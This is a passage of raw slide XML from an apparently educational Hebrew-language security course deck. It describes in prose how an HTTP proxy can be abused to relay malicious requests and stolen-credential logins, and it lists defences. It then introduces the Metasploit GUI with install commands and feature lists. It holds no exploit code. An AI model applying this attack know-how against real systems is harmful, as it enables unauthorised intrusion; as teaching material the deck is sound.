          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם השרת היעד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com/login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לא מאובטח כראוי, תוקף יכול לנצל את השרת כדי לבצע פעולות כמו התחברות עם פרטי משתמש גנובים, שליחת נתונים רגישים, או התקפות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>העברת בקשות זדוניות לשרתים אחרים</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול להשתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לשלוח בקשות זדוניות לשרתים אחרים שמאוחסנים מאחורי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף שולח בקשה לכתובת של עמוד התחברות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com/login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם פרטי התחברות שהיו צריכים להיות מוגבלים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השרת היעד עלול להיות חשוף לפרצות אבטחה כמו התקפות על בסיס נתונים, התקפות של הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או חשיפת מידע אישי.</a:t>
            </a:r>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351114926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EF58F2-83EF-44EE-AAD5-EFF22402207D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="642594"/>
            <a:ext cx="10439400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפה הלכה למעשה על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7674903-E7D1-44DF-8AC5-911FDE92EECA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> לצורך התקפות משולבות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתפקד כמו מתווך שמאפשר לתוקפים לשלוח בקשות עם תוכן זדוני, הוא יכול לשמש כבסיס להתקפות אחרות כמו דליפת נתונים או תקיפות על תשתיות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול לשלוח נתונים כמו בקשות התחברות, מידע שולי, או בקשות שמבצעות פעולות מסוימות באתר היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עלול להוביל להפרת פרטיות או נזק לשירותים, במיוחד אם הם אינם מוגנים כראוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="216408676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D8F0EA-5DA7-477F-8643-7A90E4FD14E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="626165" y="642594"/>
            <a:ext cx="10499035" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפה הלכה למעשה על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD37ECE2-E4E7-4EE3-BE51-7F051BF77C6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4238045"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך למנוע את הבעיות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אימות ובקרת גישה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבל את סוגי הבקשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ודא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>שהפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מעביר רק סוגי בקשות מסוימים (למשל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בלבד).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעת גישה לכתובות רגישות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש ברשימות לבנות או בקרות גישה כדי למנוע גישה לכתובות או משאבים שאסור לגשת אליהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בבקרות תוכן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סינון תוכן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: סנן את התוכן של הבקשות המתקבלות והודעות התגובה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבלת תוכן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אל תאפשר בקשות עם תוכן פוגעני או לא נדרש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניטור ותגובה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניטור בקשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עקוב אחרי הבקשות שמטפל בהן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וודא שאין התנהגות חריגה או בקשות זדוניות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תגובה לתקיפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תהיה מוכן להתמודד עם התקפות ולנקוט צעדים כדי לצמצם נזקים אם הם מתרחשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="193388330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14EF14BE-9478-4B9C-ABCD-78F76EA1336A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="350813375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8A0F63-231C-415A-B4C5-BDDE0758C3E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3250096" y="642594"/>
            <a:ext cx="7875104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{274FB92C-178F-4EAE-BD50-4E867707F51E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4367254"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא אחד הכלים הנפוצים ביותר בתחום אבטחת המידע והשימוש בו כולל חיפוש, ניתוח, והפקת דוחות על חולשות במערכות מחשוב. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כולל ספריית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>(קודים המנצלים חולשות), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> (קודים המבוצעים לאחר ניצול החולשה), ומודולים נוספים המאפשרים לתקוף מערכות בצורה אוטומטית או ידנית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Point-and-Click Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Point-and-Click Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מתייחס לשימוש בממשק גרפי של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit Framework</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לבצע פעולות כמו סריקות, ניצול חולשות, ותחזוקת חיבור עם מערכות שנפגעו. הממשק הגרפי מקל על המשתמשים, במיוחד אלה שלא מכירים את השורות פקודה, ומספק כלי אינטואיטיביים לביצוע התקפות מורכבות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. התקנת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Metasploit Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux, Metasploit Framework </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מגיע מותקן כברירת מחדל. אם יש צורך להתקין אותו, ניתן לעשות זאת בעזרת הפקודה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get update</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt-get install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15458445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12BBA71-89B4-401F-B0A0-1B4E1BD2B27E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1265583" y="137160"/>
            <a:ext cx="10058400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FB40C86E-6821-4A71-9CA0-A9F8CB2C42B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1202635"/>
            <a:ext cx="10058400" cy="5436704"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>יתרונות השימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Point-and-Click Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>קלות שימוש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ממשק גרפי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הממשק הגרפי מספק אמצעים לניווט ויזואלי, מה שמקל על ביצוע פעולות ללא צורך לזכור פקודות רבות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>נגישות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מתאים למתחילים ולמנוסים כאחד. מי שאינו מכיר את שורת הפקודה יכול להשתמש בממשק גרפי כדי להבין את הכלים והתהליכים בצורה מוחשית יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>יעילות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהירות ביצוע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עם הכלים הגרפיים, ניתן לבצע סריקות, לנצל חולשות, ולנהל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בצורה מהירה יותר. אין צורך להקליד פקודות רבות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניהול מרכזי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הממשקים הגרפיים מספקים ניהול מרוכז לכל התהליכים. ניתן לראות את התמונה הכוללת של התקפות, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ופגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באותו מסך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>חווית משתמש משופרת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ויזואליזציה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הממשקים הגרפיים מספקים ויזואליזציה של הנתונים, כמו מפות רשת, מצב </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, וסטטיסטיקות התקפות, מה שעוזר להבין את המידע בצורה טובה יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6090558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6C5481E-0CD4-4A7F-A7AE-7E82030DC30D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A36841C-F74A-40B6-AF78-36F1F8173040}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>מרכיבי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Point-and-Click Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>סריקות וזיהוי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סריקות רשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מזהים מכשירים ברשת, פורטים פתוחים ושירותים פעילים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סריקות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
